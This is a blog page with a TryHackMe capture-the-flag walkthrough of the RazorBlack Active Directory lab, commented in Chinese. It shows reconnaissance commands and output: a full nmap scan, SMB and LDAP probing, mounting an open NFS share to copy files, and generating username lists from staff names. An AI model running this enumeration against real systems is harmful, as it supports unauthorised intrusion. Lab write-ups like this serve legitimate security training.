

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="World&#39;sEnd">
  <meta name="keywords" content="">
  
    <meta name="description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# Nma">
<meta property="og:type" content="article">
<meta property="og:title" content="TryHackMe Walkthrough - RazorBlack">
<meta property="og:url" content="https://crazyinside.github.io/post/TryHackMe-RazorBlack.html">
<meta property="og:site_name" content="Network Security Notes">
<meta property="og:description" content="Recon:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# Nma">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626034914073.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626050219563.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626135400440.png">
<meta property="article:published_time" content="2023-08-13T22:39:09.064Z">
<meta property="article:modified_time" content="2023-08-11T15:52:06.055Z">
<meta property="article:author" content="World&#39;sEnd">
<meta property="article:tag" content="Active Directory">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626034914073.png">
  
  
  
  <title>TryHackMe Walkthrough - RazorBlack - Network Security Notes</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="TryHackMe Walkthrough - RazorBlack"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-08-14 06:39" pubdate>
          August 14, 2023 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          30k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          251 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">TryHackMe Walkthrough - RazorBlack</h1>
            
            
              <div class="markdown-body">
                
                <h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nmap 7.92SVN scan initiated Sun Jun 26 03:01:18 2022 as: nmap -sC -sV -Pn -p- -T4 -O -oA nmap.txt 10.10.104.184</span></span><br><span class="line">Warning: 10.10.104.184 giving up on port because retransmission <span class="built_in">cap</span> hit (6).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.104.184</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 65507 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">53/tcp    open  domain             Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2022-06-25 19:18:49Z)</span><br><span class="line">111/tcp   open  rpcbind            2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/tcp6  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp6  rpcbind</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100003  2,3         2049/udp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3       2049/tcp   mountd</span><br><span class="line">|   100005  1,2,3       2049/tcp6  mountd</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100005  1,2,3       2049/udp6  mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/tcp6  nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp6  nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|   100024  1           2049/tcp6  status</span><br><span class="line">|   100024  1           2049/udp   status</span><br><span class="line">|_  100024  1           2049/udp6  status</span><br><span class="line">135/tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">2049/tcp  open  mountd             1-3 (RPC <span class="comment">#100005)</span></span><br><span class="line">3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server?</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: RAZ0RBLACK</span><br><span class="line">|   NetBIOS_Domain_Name: RAZ0RBLACK</span><br><span class="line">|   NetBIOS_Computer_Name: HAVEN-DC</span><br><span class="line">|   DNS_Domain_Name: raz0rblack.thm</span><br><span class="line">|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2022-06-25T19:20:39+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm</span><br><span class="line">| Not valid before: 2022-06-24T19:00:18</span><br><span class="line">|_Not valid after:  2022-12-24T19:00:18</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2022-06-25T19:20:47+00:00; 0s from scanner time.</span><br><span class="line">5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf             .NET Message Framing</span><br><span class="line">47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">49664/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49674/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49675/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49676/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49679/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49694/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49708/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49850/tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://google.com/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.92SVN%E=4%D=6/26%OT=53%CT=1%CU=42583%PV=Y%DS=2%DC=I%G=Y%TM=62B7</span><br><span class="line">OS:60EC%P=x86_64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=I%CI=I%II=I%</span><br><span class="line">OS:SS=S%TS=U)OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M5</span><br><span class="line">OS:06NW8NNS%O6=M506NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)</span><br><span class="line">OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%</span><br><span class="line">OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=</span><br><span class="line">OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%</span><br><span class="line">OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=</span><br><span class="line">OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</span><br><span class="line">OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</span><br><span class="line">OS:T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2022-06-25T19:20:41</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://google.com/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun Jun 26 03:24:28 2022 -- 1 IP address (1 host up) scanned in 1390.21 seconds</span></span><br></pre></td></tr></table></figure>

<p>先获取一个合法域身份。可以从445入手，但被拒绝了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$smbmap</span> -H 10.10.104.184 -u hello</span><br><span class="line">[!] Authentication error on 10.10.104.184</span><br></pre></td></tr></table></figure>

<p>尝试匿名LDAP：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ldapsearch</span>-ad.py -l 10.10.104.184 -t info</span><br><span class="line"><span class="comment">### Server infos ###</span></span><br><span class="line">[+] Forest functionality level = Windows 2016</span><br><span class="line">[+] Domain functionality level = Windows 2016</span><br><span class="line">[+] Domain controller functionality level = Windows 2016</span><br><span class="line">[+] rootDomainNamingContext = DC=raz0rblack,DC=thm</span><br><span class="line">[+] defaultNamingContext = DC=raz0rblack,DC=thm</span><br><span class="line">[+] ldapServiceName = raz0rblack.thm:haven-dc<span class="variable">$@RAZ0RBLACK</span>.THM</span><br><span class="line">[+] naming_contexts = [<span class="string">&#x27;DC=raz0rblack,DC=thm&#x27;</span>, <span class="string">&#x27;CN=Configuration,DC=raz0rblack,DC=thm&#x27;</span>, <span class="string">&#x27;CN=Schema,CN=Configuration,DC=raz0rblack,DC=thm&#x27;</span>, <span class="string">&#x27;DC=DomainDnsZones,DC=raz0rblack,DC=thm&#x27;</span>, <span class="string">&#x27;DC=ForestDnsZones,DC=raz0rblack,DC=thm&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>Windows 2016：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ldapsearch</span> -x -b <span class="string">&quot;dc=raz0rblack,dc=thm&quot;</span> -H ldap://10.10.104.184</span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;dc=raz0rblack,dc=thm&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line">search: 2</span><br><span class="line">result: 1 Operations error</span><br><span class="line">text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera</span><br><span class="line"> tion a successful <span class="built_in">bind</span> must be completed on the connection., data 0, v4563</span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 1</span></span><br></pre></td></tr></table></figure>

<p>没什么东西。从Nmap返回信息中能看到RPC是有东西的，而且目标开放了2049端口。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$showmount</span> -e 10.10.104.184</span><br><span class="line">Export list <span class="keyword">for</span> 10.10.104.184:</span><br><span class="line">/users (everyone)</span><br><span class="line"><span class="variable">$mkdir</span> <span class="built_in">users</span></span><br><span class="line"><span class="variable">$sudo</span> mount -t nfs 10.10.104.184:/users /home/mosaic/tmp/users</span><br><span class="line"><span class="variable">$sudo</span> <span class="built_in">ls</span> <span class="built_in">users</span>/</span><br><span class="line">employee_status.xlsx  sbradley.t</span><br><span class="line"><span class="variable">$sudo</span> <span class="built_in">cp</span> <span class="built_in">users</span>/* .</span><br><span class="line"><span class="variable">$cat</span> sbradley.txt </span><br><span class="line">��THM&#123;ab53.........................&#125;</span><br></pre></td></tr></table></figure>

<p>另一个xlsx文件中会有一些用户名：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220626034914073.png" srcset="/img/loading.gif" lazyload alt="image-20220626034914073"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span> user</span><br><span class="line">daven port</span><br><span class="line">imogen royce</span><br><span class="line">tamara vidal</span><br><span class="line">arthur edwards</span><br><span class="line">carl ingram</span><br><span class="line">nolan cassidy</span><br><span class="line">reza zaydan</span><br><span class="line">ljudmila vetrova</span><br><span class="line">rico delgado</span><br><span class="line">tyson williams</span><br><span class="line">steven bradley</span><br><span class="line">chamber lin</span><br></pre></td></tr></table></figure>

<p>可以自由组合生成更多用户名：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$namemash</span>.py user &gt; users.txt</span><br><span class="line"><span class="variable">$cat</span> users.txt </span><br><span class="line">davenport</span><br><span class="line">portdaven</span><br><span class="line">daven.port</span><br><span class="line">port.daven</span><br><span class="line">portd</span><br><span class="line">dport</span><br><span class="line">pdaven</span><br><span class="line">d.port</span><br><span class="line">p.daven</span><br><span class="line">daven</span><br><span class="line">port</span><br><span class="line">imogenroyce</span><br><span class="line">royceimogen</span><br><span class="line">imogen.royce</span><br><span class="line">royce.imogen</span><br><span class="line">roycei</span><br><span class="line">iroyce</span><br><span class="line">rimogen</span><br><span class="line">i.royce</span><br><span class="line">r.imogen</span><br><span class="line">imogen</span><br><span class="line">royce</span><br><span class="line">tamaravidal</span><br><span class="line">vidaltamara</span><br><span class="line">tamara.vidal</span><br><span class="line">vidal.tamara</span><br><span class="line">vidalt</span><br><span class="line">tvidal</span><br><span class="line">vtamara</span><br><span class="line">t.vidal</span><br><span class="line">v.tamara</span><br><span class="line">tamara</span><br><span class="line">vidal</span><br><span class="line">arthuredwards</span><br><span class="line">edwardsarthur</span><br><span class="line">arthur.edwards</span><br><span class="line">edwards.arthur</span><br><span class="line">edwardsa</span><br><span class="line">aedwards</span><br><span class="line">earthur</span><br><span class="line">a.edwards</span><br><span class="line">e.arthur</span><br><span class="line">arthur</span><br><span class="line">edwards</span><br><span class="line">carlingram</span><br><span class="line">ingramcarl</span><br><span class="line">carl.ingram</span><br><span class="line">ingram.carl</span><br><span class="line">ingramc</span><br><span class="line">cingram</span><br><span class="line">icarl</span><br><span class="line">c.ingram</span><br><span class="line">i.carl</span><br><span class="line">carl</span><br><span class="line">ingram</span><br><span class="line">nolancassidy</span><br><span class="line">cassidynolan</span><br><span class="line">nolan.cassidy</span><br><span class="line">cassidy.nolan</span><br><span class="line">cassidyn</span><br><span class="line">ncassidy</span><br><span class="line">cnolan</span><br><span class="line">n.cassidy</span><br><span class="line">c.nolan</span><br><span class="line">nolan</span><br><span class="line">cassidy</span><br><span class="line">rezazaydan</span><br><span class="line">zaydanreza</span><br><span class="line">reza.zaydan</span><br><span class="line">zaydan.reza</span><br><span class="line">zaydanr</span><br><span class="line">rzaydan</span><br><span class="line">zreza</span><br><span class="line">r.zaydan</span><br><span class="line">z.reza</span><br><span class="line">reza</span><br><span class="line">zaydan</span><br><span class="line">ljudmilavetrova</span><br><span class="line">vetrovaljudmila</span><br><span class="line">ljudmila.vetrova</span><br><span class="line">vetrova.ljudmila</span><br><span class="line">vetroval</span><br><span class="line">lvetrova</span><br><span class="line">vljudmila</span><br><span class="line">l.vetrova</span><br><span class="line">v.ljudmila</span><br><span class="line">ljudmila</span><br><span class="line">vetrova</span><br><span class="line">ricodelgado</span><br><span class="line">delgadorico</span><br><span class="line">rico.delgado</span><br><span class="line">delgado.rico</span><br><span class="line">delgador</span><br><span class="line">rdelgado</span><br><span class="line">drico</span><br><span class="line">r.delgado</span><br><span class="line">d.rico</span><br><span class="line">rico</span><br><span class="line">delgado</span><br><span class="line">tysonwilliams</span><br><span class="line">williamstyson</span><br><span class="line">tyson.williams</span><br><span class="line">williams.tyson</span><br><span class="line">williamst</span><br><span class="line">twilliams</span><br><span class="line">wtyson</span><br><span class="line">t.williams</span><br><span class="line">w.tyson</span><br><span class="line">tyson</span><br><span class="line">williams</span><br><span class="line">stevenbradley</span><br><span class="line">bradleysteven</span><br><span class="line">steven.bradley</span><br><span class="line">bradley.steven</span><br><span class="line">bradleys</span><br><span class="line">sbradley</span><br><span class="line">bsteven</span><br><span class="line">s.bradley</span><br><span class="line">b.steven</span><br><span class="line">steven</span><br><span class="line">bradley</span><br><span class="line">chamberlin</span><br><span class="line">linchamber</span><br><span class="line">chamber.lin</span><br><span class="line">lin.chamber</span><br><span class="line">linc</span><br><span class="line">clin</span><br><span class="line">lchamber</span><br><span class="line">c.lin</span><br><span class="line">l.chamber</span><br><span class="line">chamber</span><br><span class="line">lin</span><br></pre></td></tr></table></figure>

